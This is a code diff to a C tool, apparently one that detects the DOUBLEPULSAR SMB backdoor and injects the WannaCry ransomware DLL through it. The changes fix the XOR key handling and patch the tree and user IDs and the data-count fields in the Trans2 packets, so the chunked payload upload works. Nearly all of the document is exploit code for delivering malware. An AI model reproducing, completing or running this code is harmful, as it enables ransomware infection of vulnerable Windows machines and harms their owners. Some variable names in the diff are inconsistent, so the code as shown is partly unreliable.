@@ -155,7 +155,8 @@ int IsDOUBLEPULSARInstalled(char *host, int flagUninstall, u_short hostshort)
 	return 0;
 }
 
-int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int xkey)
+//https://gist.github.com/msuiche/691e52fd5f0d8b760080640687e23d60
+int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, unsigned int XorKey)
 {
 	/*
 	DWORD WannacryFileSize = value of -> ReadFile Wannacry EXE into -> EXE_BUFFER_SOMEWHERE
@@ -163,7 +164,7 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int
 	DWORD totalPayloadSize_x64 = 0xc8a4 + 0x1800 + WannacryFileSize;
 	*/
 
-	unsigned char byte_xor_key[5];
+	unsigned char byte_xor_key[4];
 	byte_xor_key[0] = (unsigned char)XorKey;
 	byte_xor_key[1] = (unsigned char)(((unsigned int)XorKey >> 8) & 0xFF);
 	byte_xor_key[2] = (unsigned char)(((unsigned int)XorKey >> 16) & 0xFF);
@@ -312,6 +313,10 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int
 			//copy wannacry skeleton packet to big Trans2 packet
 			memcpy((unsigned char*)send_buffer, (unsigned char*)wannacry_Trans2_Request, 70);
 
+			//Update treeID, UserID in the Tran2 execution packet
+			memcpy((unsigned char*)send_buffer + 28, (unsigned char*)&treeid, 2);
+			memcpy((unsigned char*)send_buffer + 32, (unsigned char*)&userid, 2);
+			
 			//copy parameters to big packet at offset 70 ( after the trans2 exec packet )
 			memcpy((unsigned char*)send_buffer + 70, (unsigned char*)Parametersbuffer, 12);
 
@@ -335,7 +340,8 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int
 			bytesleft -= 4096;
 		}
 	}
-	
+
+	//upload the remainder bytes, last packet
 	if ( v10 > 0 )
 	{
 		memset(Parametersbuffer, 0x00, 12);
@@ -351,6 +357,15 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int
 		
 		//wannacry_Trans2_Request is 70 bytes
 		memcpy((unsigned char*)send_buffer, (unsigned char*)wannacry_Trans2_Request, 70);
+
+		//patch TotalDataCount, DataCount and ByteCount values in the last packet
+		*(WORD*)(send_buffer + 0x27) = bytesLeft;
+		*(WORD*)(send_buffer + 0x3b) = bytesLeft;
+		*(WORD*)(send_buffer + 0x43) = bytesLeft + 13;
+
+		//Update treeID, UserID in the Tran2 execution packet
+		memcpy((unsigned char*)send_buffer + 28, (unsigned char*)&treeid, 2);
+		memcpy((unsigned char*)send_buffer + 32, (unsigned char*)&userid, 2);
 		
 		//update last packet SMB Length
 		unsigned short smblen;
@@ -361,10 +376,10 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int
 		memcpy(buffer + 2, &smb_length_value, 2);
 
 		//copy parameters to offset 70 ( after trans2 execution packet )
-		memcpy(send_buffer + 70 , Parametersbuffer, 12);
+		memcpy(send_buffer + 70 , (unsigned char*)Parametersbuffer, 12);
 		
 		//copy last payload size = bytesLeft
-		memcpy(send_buffer + 82, (char *)hMem + ctx, bytesLeft);
+		memcpy(send_buffer + 82, (unsigned char *)hMem + ctx, bytesLeft);
 		send(socket, (char*)send_buffer, bytesLeft+82, 0);
 		recv(socket, (char*)recv_buffer, 4096, 0);
 	}
